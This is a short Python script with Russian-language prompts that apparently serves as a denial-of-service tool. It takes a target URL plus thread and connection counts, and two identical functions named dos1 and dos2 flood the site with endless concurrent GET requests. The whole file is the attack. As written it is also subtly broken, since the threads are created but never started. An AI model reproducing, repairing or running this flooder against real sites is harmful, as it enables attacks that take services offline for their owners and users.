import grequests
import threading

site = input("Введите URL сайта: ")
threads = int(input("Введите количество потоков[max 1000]: "))
connect = int(input("Введите количество подключений[max: 100]: "))

if connect > 100 or threads > 1000:
    exit("Неверные значения!")
packet = 0

def dos1(con, sit):
    while True:
        site_info = [sit for x in range(con)]

        response = (grequests.get(url) for url in site_info)
        grequests.map(response)

def dos2(con, sit):
    while True:
        site_info = [sit for x in range(con)]

        response = (grequests.get(url) for url in site_info)
        grequests.map(response)

for potocki in range(threads):
    threading.Thread(target=dos1, args=(connect, site,))
    threading.Thread(target=dos2, args=(connect, site,))